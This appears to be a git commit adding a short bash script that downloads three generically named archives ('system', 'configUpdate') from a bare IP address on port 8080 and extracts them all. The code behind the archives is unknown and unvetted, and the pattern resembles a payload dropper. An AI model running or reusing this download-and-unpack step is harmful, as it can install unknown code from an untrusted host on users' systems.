112e364e52989ca945ab08f86d66eecda378a200
MiguelCasaresRobles <miguel_27793@hotmail.com>
2020-04-08 21:36:55 +0200

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+wget http://103.206.123.13:8080/system.tar.gz
+wget http://103.206.123.13:8080/configUpdate.tar.gz
+wget http://103.206.123.13:8080/configUpdate-32.tar.gz
+
+
+tar xvzf *
